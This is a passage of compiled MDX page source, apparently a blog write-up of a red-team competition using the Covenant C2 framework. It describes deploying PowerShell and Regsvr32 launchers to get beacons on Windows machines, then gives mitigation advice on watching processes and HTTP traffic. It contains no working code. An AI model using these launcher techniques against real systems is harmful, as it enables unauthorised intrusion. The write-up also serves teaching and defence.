\"sizes\": \"(max-width: 890px) 100vw, 890px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/3f8773f032f33b909b35948adf617d86/91293/post_topwnboard.png\",\n    \"alt\": \"post_req\",\n    \"title\": \"post_req\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"This function is inside Covenant/GruntController.cs,\\nit just does a post request using the Grunt\\u2019s ip address\\nwrapped inside a try catch statement in case we lose connection.\"), mdx(\"p\", null, \"Due to last minute complications, the dotnet framework couldn\\u2019t\\nbe installed on every Windows box so I used a powershell launcher\\nfor all of the boxes as well as the Regsvr32 launcher if possible.\\nAs we could prebake our stuff I was able to deploy to all of the boxes\\nand watch the beacons rain down as well as turn the pwnboard red.\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1920px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"42.1875%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAABJ0AAASdAHeZh94AAABXElEQVQoz01RW07CUBTsfkxMFGNEUOkDSqEFhQL6awT3opiAbkHYCbgBXoUEmgBuY5zTWyofk3mefvRq1css5nYDi3wdi4KPoNjEnDqQrCC5T09Y9UgHzJINecGdbAOnxU0NWvn8CgGHS7OGJXklB9QR8yNLQvRKNpZ/tFG5+Cizm8weoPnpO6ytKja6h41RQRjr0KxG/qBD0dIfb4TjLszfY51zodmpDEZeB+NyG+PSC8beK0bkH7eNkRtnrupHshHQq01HdaIrvHOeoenXNnqtd/SbRKurQP0Z8yET35P8sRuhz5uvpw/VSUbda7xBK51eYGt52Otl7AwXe9PDjnpvxRxlbsQ7o6w0Id2vVYkz3lNvcw4fJZXGhD97ZtQw5QPMqKd8FMX0pspm7KaJVt0830huZnygic5HyZ6cYXBbwiBbxODGwZAYZGwM4yzykksf43/jJF7wnSngD9J0e5Qt6ZSiAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/0e4b959883f1cb5739fc23f5eb277816/f3ff0/pwnboard_red.webp 1920w\"],\n    \"sizes\": \"(max-width: 1920px) 100vw, 1920px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/0e4b959883f1cb5739fc23f5eb277816/7d442/pwnboard_red.png 1920w\"],\n    \"sizes\": \"(max-width: 1920px) 100vw, 1920px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/0e4b959883f1cb5739fc23f5eb277816/7d442/pwnboard_red.png\",\n    \"alt\": \"pwnboard-red\",\n    \"title\": \"pwnboard-red\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"At the start of the competition these are just some of the beacons.\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1740px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"59.25287356321839%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAABJ0AAASdAHeZh94AAABv0lEQVQoz3WSSW/CQAyFQwh7SCY7YRUIISQO/BkEHNoDQikg/v/51c9l1CLoYTSO4/n8vDj7/R4fnx/Y7Xa43W6oqgqn0wnn8xmXywX3+x2X6xVXOVX1pTfj6Kd9PB5xOBz05nEazSZarRYcx0FeFOj1eqjVXLiuq35jDHzfR7vd1hj+7/f7CMMQ3W5XfU8nSVJkaYqmgKezGVKxoyhSUJZlGI1GGAwGahNaSFL6ptMphsMhPM/T5PV6XY/Dx0mS6A8G0jbi8/2+gvM81yShCVETBXEcoyxLTCYTuQdSTe1ZIQOYncDlcqkKAiknFIVFkasSJiKYLShFFb//BVIRSyZwsVjow/ABZCI+ZGm0G42GqvsFlq/AvyUTmGYpgiBQKEsdj8faQybiEGgTRD+reQEa8wN0paG2h4T1ZLIcjB2IiYw+ZhL6GPsWaBVyQgzmikTS146o8R9QJvBlVTyvLisTqMKZbARb8ToUgdmGr1Yrzao9DI367XpQJVeL6vhN/9seWgX8mM/nCuTi8sRJrErYL8Kdx9oQyqHwfllsBq7Xa12H7XaLzWajkE6no8Oxe8jEXGzatmT2kao5fXu+ASpTLf30lvMCAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/e2512df591851a8bba7030894355e6a4/68a58/call_backs.webp 1740w\"],\n    \"sizes\": \"(max-width: 1740px) 100vw, 1740px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/e2512df591851a8bba7030894355e6a4/8d39c/call_backs.png 1740w\"],\n    \"sizes\": \"(max-width: 1740px) 100vw, 1740px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/e2512df591851a8bba7030894355e6a4/8d39c/call_backs.png\",\n    \"alt\": \"call_backs\",\n    \"title\": \"call_backs\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"h3\", {\n    \"id\": \"mitigation\"\n  }, \"Mitigation\"), mdx(\"p\", null, \"Monitoring processes and network traffic on your system is\\ncrucial as it will be much easier to spot when something\\nis out of the ordinary. For example if you\\u2019ve never seen\\nRegsvr32 running on your system before it might be worthwhile\\nto investigate and you would be shocked at what you find.\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1235px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"43.64372469635628%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAJCAYAAAAywQxIAAAACXBIWXMAABJ0AAASdAHeZh94AAAA40lEQVQoz5VSAY6DIBDk/z806aXt5WhR0KIWFRXndmlo2sR65yYTYFlgdgYhpYRSOeq6hrU2jq+43WzMM5xzGIZhFV3XoWkaiIoO8KRt7xjHcRPzPCOE8BwTeL0sCyFAaG2gC02vd0jx2NwHfnCaJojT8YQiL1CaMjLltrz3H1tbA9ezPDwXh8PX8yJObum0hb7vI0uRkyGlMfCUDKTF9IeOa+BWlVKRjDCVhVQauiJHGxf1+G+kWjYmy7KHyz/yAk36FbrE8fxN9P0uY1It68huC3VV6OkPubujr9O+XbaHZYpfFSy+awtw2GkAAAAASUVORK5CYII=')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/e9be5fd4f9ca8329fa8816da8f9a8cde/72670/procexp_regsvr.webp 1235w\"],\n    \"sizes\": \"(max-width: 1235px) 100vw, 1235px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/e9be5fd4f9ca8329fa8816da8f9a8cde/2360d/procexp_regsvr.png 1235w\"],\n    \"sizes\": \"(max-width: 1235px) 100vw, 1235px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/e9be5fd4f9ca8329fa8816da8f9a8cde/2360d/procexp_regsvr.png\",\n    \"alt\": \"RegsvrImage\",\n    \"title\": \"RegsvrImage\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"However, knowing what\\u2019s going in and out of your network is just as\\nimportant if you opened wireshark and noticed a lot of http\\ntraffic that would be highly suspicious.\\nFor example, if you noticed this http traffic.\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1896px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"37.13080168776371%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAHCAYAAAAIy204AAAACXBIWXMAABJ0AAASdAHeZh94AAABdUlEQVQoz12Pa1OCQBSG+f9/pvKaWtmoKeAooIKIoHIVBNQcpyS1t8Pqpz48c97dc84zu5yZmpiGU+iRDiOeQVtrsLYWYbKsBhrrzRMDZjqH9+VinflYn/6RBfCONriBs0Nb99E1Q/TMCLy1geQdIPkHCIsYzYmNd9VBxwioF0FLMsz3Vxi7Cwyqs+2ZoRNGfAYn+SZ6lgpxpYNfahBtHeNoRSwhLKdo6TLaMwV9e4aBa0IOVlBjl/oOY3HcMKxjhMVnCk7d1zAMi1CSCia7Z4zSKuS4jEXWhBSVIHiP6AcF9P0n8M4DOw/Wt3OefXTgMVpwMxmctn+DtMlFdUy2LxinDcoNWKcWiWu0WCZBBYOwyvKQqrypQYnrdF+FffkgGU90Yf+McuErDVdo+SZVkhrLuXAYVSG4RYheiWQl9JwCCStsJp/N5Tdhjwmdi3gX0gsUes0oqbOaY3232ILgkNAtkbRMXy6yOzaT3IXnm9D9Ja48/gBBhu/E9xgU6QAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/5220c523646208697ab06ddf88fd8e9b/fe160/http_traffic.webp 1896w\"],\n    \"sizes\": \"(max-width: 1896px) 100vw, 1896px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/5220c523646208697ab06ddf88fd8e9b/57a56/http_traffic.png 1896w\"],\n    \"sizes\": \"(max-width: 1896px) 100vw, 1896px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/5220c523646208697ab06ddf88fd8e9b/57a56/http_traffic.png\",\n    \"alt\": \"http-traffic\",\n    \"title\": \"http-traffic\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"p\", null, \"Upon noticing this you followed the http stream you would notice this.\"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"1239px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"69.65294592413237%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAOCAYAAAAvxDzwAAAACXBIWXMAABJ0AAASdAHeZh94AAABtElEQVQ4y6VTa0/DMAzs//9T09Y0TQds05BA60BIsHUPoAWExniMw5fEK9s3RKVTEjs+n+00mVy/YFa9onl+R/20xUP9hs32Cx9fO7x//h1JtdxiWjZYrzdomi12u2/850vOL2qcna1QFEuMx/eYThtMrxqUZVj9OaIsa0wmNS4vH/2etivelZX2m5tnJLZYIMvmyPMKvd4dut2AXm8GI3ZCbWk6O9gTxszjfo7+yRKJ6y/hhIyEdOaugrVzn0QT6Zl+tRF6x7kFrKyDwQpJLgp9gMDaSkpvFWdCQNU806ckxgT1JKI6+mhn6zwhL7BElhIyxsCoigmVjCtJvLooQpUPR+tQ8nEpNgbvAyOonopTSU51FEJCotO5xXAohFkkOQ4OPQ2Np3r1M7nvdYwhmZNEPO8JWZJeCkNo+2VjAj91E8p0LtyhSh0m7Z7Q9zANTVZ15vcQbBjCIXH7XEwcUldaMRiugkJtfDu1QJiadoJaoqrRvivoOz2Vd5jFpjKzPpV9oAnZ9dkolGBvi6T+2dhCDrkoKKoAJ8Eu2mR1/Ur+gIX30e6KyoPnzM78nne5jsZr/ADtr9kuj/+ORQAAAABJRU5ErkJggg==')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/a969e078f7a9d5d4959286f79ca13bda/c34b5/long-command.webp 1239w\"],\n    \"sizes\": \"(max-width: 1239px) 100vw, 1239px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/a969e078f7a9d5d4959286f79ca13bda/be8a4/long-command.png 1239w\"],\n    \"sizes\": \"(max-width: 1239px) 100vw, 1239px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/a969e078f7a9d5d4959286f79ca13bda/be8a4/long-command.png\",\n    \"alt\": \"encoded-command\",\n    \"title\": \"encoded-command\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"h3\", {\n    \"id\": \"take-aways\"\n  }, \"Take Aways\"), mdx(\"p\", null, \"Although Covenant may seem somewhat limited in what it can\\ndo compared to other C2\\u2019s such as Powershell Empire\\nor Pupy. You have to keep in mind this came out about in February,\\nregardless Covenant can already do a lot and comes with a vast amount\\nof rich features that are hard to ignore.\\nOverall Covenant is a solid choice for a C2 framework.\"), mdx(\"p\", null, \"References:\"), mdx(\"p\", null, mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Regsvr32 Info\")));\n}\n;\nMDXContent.isMDXComponent = true;","hero":{"full":{"base64":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAABJ0AAASdAHeZh94AAABXElEQVQoz01RW07CUBTsfkxMFGNEUOkDSqEFhQL6awT3opiAbkHYCbgBXoUEmgBuY5zTWyofk3mefvRq1css5nYDi3wdi4KPoNjEnDqQrCC5T09Y9UgHzJINecGdbAOnxU0NWvn8CgGHS7OGJXklB9QR8yNLQvRKNpZ/tFG5+Cizm8weoPnpO6ytKja6h41RQRjr0KxG/qBD0dIfb4TjLszfY51zodmpDEZeB+NyG+PSC8beK0bkH7eNkRtnrupHshHQq01HdaIrvHOeoenXNnqtd/SbRKurQP0Z8yET35P8sRuhz5uvpw/VSUbda7xBK51eYGt52Otl7AwXe9PDjnpvxRxlbsQ7o6w0Id2vVYkz3lNvcw4fJZXGhD97ZtQw5QPMqKd8FMX0pspm7KaJVt0830huZnygic5HyZ6cYXBbwiBbxODGwZAYZGwM4yzykksf43/jJF7wnSngD9J0e5Qt6ZSiAAAAAElFTkSuQmCC","aspectRatio":2.3703703703703702,"src":"/static/0e4b959883f1cb5739fc23f5eb277816/a1946/pwnboard_image.png","srcSet":"/static/0e4b959883f1cb5739fc23f5eb277816/5b37e/pwnboard_image.png 236w,\n/static/0e4b959883f1cb5739fc23f5eb277816/49058/pwnboard_image.png 472w,\n/static/0e4b959883f1cb5739fc23f5eb277816/a1946/pwnboard_image.png 944w,\n/static/0e4b959883f1cb5739fc23f5eb277816/030f1/pwnboard_image.png 1416w,\n/static/0e4b959883f1cb5739fc23f5eb277816/75927/pwnboard_image.png 1888w,\n/static/0e4b959883f1cb5739fc23f5eb277816/0e6e2/pwnboard_image.png 1920w","srcWebp":"/static/0e4b959883f1cb5739fc23f5eb277816/99fbb/pwnboard_image.webp","srcSetWebp":"/static/0e4b959883f1cb5739fc23f5eb277816/77392/pwnboard_image.webp 236w,\n/static/0e4b959883f1cb5739fc23f5eb277816/1f177/pwnboard_image.webp 472w,\n/static/0e4b959883f1cb5739fc23f5eb277816/99fbb/pwnboard_image.webp 944w,\n/static/0e4b959883f1cb5739fc23f5eb277816/4a492/pwnboard_image.webp 1416w,\n/static/0e4b959883f1cb5739fc23f5eb277816/b0b8f/pwnboard_image.webp 1888w,\n/static/0e4b959883f1cb5739fc23f5eb277816/30cf3/pwnboard_image.webp 1920w","sizes":"(max-width: 944px) 100vw, 944px"},"regular":{"base64":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAABJ0AAASdAHeZh94AAABXElEQVQoz01RW07CUBTsfkxMFGNEUOkDSqEFhQL6awT3opiAbkHYCbgBXoUEmgBuY5zTWyofk3mefvRq1css5nYDi3wdi4KPoNjEnDqQrCC5T09Y9UgHzJINecGdbAOnxU0NWvn8CgGHS7OGJXklB9QR8yNLQvRKNpZ/tFG5+Cizm8weoPnpO6ytKja6h41RQRjr0KxG/qBD0dIfb4TjLszfY51zodmpDEZeB+NyG+PSC8beK0bkH7eNkRtnrupHshHQq01HdaIrvHOeoenXNnqtd/SbRKurQP0Z8yET35P8sRuhz5uvpw/VSUbda7xBK51eYGt52Otl7AwXe9PDjnpvxRxlbsQ7o6w0Id2vVYkz3lNvcw4fJZXGhD97ZtQw5QPMqKd8FMX0pspm7KaJVt0830huZnygic5HyZ6cYXBbwiBbxODGwZAYZGwM4yzykksf43/jJF7wnSngD9J0e5Qt6ZSiAAAAAElFTkSuQmCC","aspectRatio":2.3703703703703702,"src":"/static/0e4b959883f1cb5739fc23f5eb277816/3ddd4/pwnboard_image.png","srcSet":"/static/0e4b959883f1cb5739fc23f5eb277816/078a8/pwnboard_image.png 163w,\n/static/0e4b959883f1cb5739fc23f5eb277816/e56da/pwnboard_image.png 327w,\n/static/0e4b959883f1cb5739fc23f5eb277816/3ddd4/pwnboard_image.png 653w,\n/static/0e4b959883f1cb5739fc23f5eb277816/c5cc7/pwnboard_image.png 980w,\n/static/0e4b959883f1cb5739fc23f5eb277816/eebd2/pwnboard_image.png 1306w,\n/static/0e4b959883f1cb5739fc23f5eb277816/0e6e2/pwnboard_image.png 1920w","srcWebp":"/static/0e4b959883f1cb5739fc23f5eb277816/0acdf/pwnboard_image.webp","srcSetWebp":"/static/0e4b959883f1cb5739fc23f5eb277816/ac59e/pwnboard_image.webp 163w,\n/static/0e4b959883f1cb5739fc23f5eb277816/7660b/pwnboard_image.webp 327w,\n/static/0e4b959883f1cb5739fc23f5eb277816/0acdf/pwnboard_image.webp 653w,\n/static/0e4b959883f1cb5739fc23f5eb277816/75470/pwnboard_image.webp 980w,\n/static/0e4b959883f1cb5739fc23f5eb277816/68d47/pwnboard_image.webp 1306w,\n/static/0e4b959883f1cb5739fc23f5eb277816/30cf3/pwnboard_image.webp 1920w","sizes":"(max-width: 653px) 100vw, 653px"},"narrow":{"base64":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAICAYAAAD5nd/tAAAACXBIWXMAABJ0AAASdAHeZh94AAABXElEQVQoz01RW07CUBTsfkxMFGNEUOkDSqEFhQL6awT3opiAbkHYCbgBXoUEmgBuY5zTWyofk3mefvRq1css5nYDi3wdi4KPoNjEnDqQrCC5T09Y9UgHzJINecGdbAOnxU0NWvn8CgGHS7OGJXklB9QR8yNLQvRKNpZ/tFG5+Cizm8weoPnpO6ytKja6h41RQRjr0KxG/qBD0dIfb4TjLszfY51zodmpDEZeB+NyG+PSC8beK0bkH7eNkRtnrupHshHQq01HdaIrvHOeoenXNnqtd/SbRKurQP0Z8yET35P8sRuhz5uvpw/VSUbda7xBK51eYGt52Otl7AwXe9PDjnpvxRxlbsQ7o6w0Id2vVYkz3lNvcw4fJZXGhD97ZtQw5QPMqKd8FMX0pspm7KaJVt0830huZnygic5HyZ6cYXBbwiBbxODGwZAYZGwM4yzykksf43/jJF7wnSngD9J0e5Qt6ZSiAAAAAElFTkSuQmCC","aspectRatio":2.3703703703703702,"src":"/static/0e4b959883f1cb5739fc23f5eb277816/502b1/pwnboard_image.png","srcSet":"/static/0e4b959883f1cb5739fc23f5eb277816/f2e6d/pwnboard_image.png 114w,\n/static/0e4b959883f1cb5739fc23f5eb277816/4ddba/pwnboard_image.png 229w,\n/static/0e4b959883f1cb5739fc23f5eb277816/502b1/pwnboard_image.png 457w,\n/static/0e4b959883f1cb5739fc23f5eb277816/7ddc2/pwnboard_image.png 686w,\n/static/0e4b959883f1cb5739fc23f5eb277816/435bf/pwnboard_image.png 914w,\n/static/0e4b959883f1cb5739fc23f5eb277816/0e6e2/pwnboard_image.png 1920w","srcWebp":"/static/0e4b959883f1cb5739fc23f5eb277816/15384/pwnboard_image.webp","srcSetWebp":"/static/0e4b959883f1cb5739fc23f5eb277816/31fce/pwnboard_image.webp 114w,\n/static/0e4b959883f1cb5739fc23f5eb277816/e3e25/pwnboard_image.webp 229w,\n/static/0e4b959883f1cb5739fc23f5eb277816/15384/pwnboard_image.webp 457w,\n/static/0e4b959883f1cb5739fc23f5eb277816/0258d/pwnboard_image.webp 686w,\n/static/0e4b959883f1cb5739fc23f5eb277816/64ea2/pwnboard_image.webp 914w,\n/static/0e4b959883f1cb5739fc23f5eb277816/30cf3/pwnboard_image.webp 1920w","sizes":"(max-width: 457px) 100vw, 457px"},"seo":{"src":"/static/0e4b959883f1cb5739fc23f5eb277816/6050d/pwnboard_image.png"}}}]}}}